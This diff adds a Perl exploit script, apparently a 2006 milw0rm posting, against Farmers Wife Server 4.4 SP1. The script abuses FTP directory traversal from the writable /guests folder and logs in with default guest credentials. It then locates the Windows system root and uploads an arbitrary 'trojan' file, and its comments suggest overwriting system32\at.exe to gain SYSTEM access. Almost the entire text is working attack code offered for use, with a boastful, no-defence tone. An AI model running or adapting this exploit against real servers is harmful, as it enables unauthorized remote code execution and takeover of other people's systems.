@@ -1,0 +1,56 @@
+#!/usr/bin/perl
+# kokanin 20060106 // farmers wife server 4.4 sp1 allows us to 
+# use ../../../ patterns as long as we stand in a folder where we have write access.
+# haha, that's what you get for implementing your own access control instead of relying on the underlying OS.
+# default port is 22003, default writable path is /guests.
+
+# 0day 0day, private, distribute and die bla bla bla
+# leet (translated) note from <anonymized>: you can log in as IEUser/mail@mail.com or anonymous/mail@mail.com
+# on _all_ farmers wife servers. This can't be disabled unless you turn off FTP access. The anonymous
+# login gives you guest access, which means write access to /guests, which means default remote 'root'
+# aka SYSTEM access. Ha ha ha, thanks anonymized, I missed that bit.
+
+
+if(!$ARGV[0]){ die "Usage: ./thisscript.pl <ip> [user] [pass] [port] [path] [trojan.exe] [/path/to/target.exe] \n";}
+# as in: ./thisscript.pl 123.45.67.89 demo demo 22003 /writablepath /etc/hosts /owned.txt
+# by default we just put /etc/hosts in a file called owned.txt in the root of the drive - 
+# nuke %SYSTEMROOT%\system32\at.exe and wait for windows to run it.
+
+# We can check for the %SYSTEMROOT% with the SIZE command to determine the proper
+# location for our trojan.
+
+use Net::FTP;
+my $target = $ARGV[0];
+my $dotdot = "../../../../../../../../../../../../../../";
+# Here we set defaults (It's ugly, I know) that gives REMOTE REWT OMGOMG I MEAN SYSTEM
+if($ARGV[1]){ $user = $ARGV[1] } else { $user = "IEUser";}
+if($ARGV[2]){ $pass = $ARGV[2] } else { $pass = "mail\@mail.com";}
+if($ARGV[3]){ $port = $ARGV[3] } else { $port = "22003";}
+if($ARGV[4]){ $writablepath = $ARGV[4] } else { $writablepath = "/guests";}
+if($ARGV[5]){ $trojan = $ARGV[5] } else { $trojan = "/etc/hosts";}
+if($ARGV[6]){ $destination = $ARGV[6] } else { $destination = "owned.txt";}
+print " target: $target \n user: $user \n pass: $pass \n port: $port \n writable path: $writablepath \n trojan: $trojan \n targetfile: $destination \n";
+
+# Open the command socket
+use Net::FTP;
+$ftp = Net::FTP->new("$target",
+                      Debug => 0,
+                      Port => "$port")
+	or die "Cannot connect: $@";
+	$ftp->login("$user","$pass")
+	or die "Cannot login ", $ftp->message;
+	$ftp->cwd("$writablepath")
+	# this software is so shitty, it allows us to CWD to any folder and just pukes later if it's not there.
+	or die "Cannot go to writable dir ", $ftp->message;
+	# leet %SYSTEMROOT% scan by determining where at.exe is using SIZE
+	my @systemroots = ("PUNIX","WINXP","WINNT","WIN2000","WIN2K","WINDOWS","WINDOZE");
+	for(@systemroots){
+		$reply = $ftp->quot("SIZE " . $dotdot . $_ . "/system32/at.exe");
+		if($reply == 2) { print " %SYSTEMROOT% is /$_\n";my $systemroot=$_; }
+		}
+	$ftp->binary;
+	$ftp->put("$trojan","$dotdot"."$destination")
+	and print "file successfully uploaded, donate money to kokanin\@gmail.com\n" or die "Something messed up, file upload failed ", $ftp->message;
+$ftp->quit;
+
+# milw0rm.com [2006-01-14]
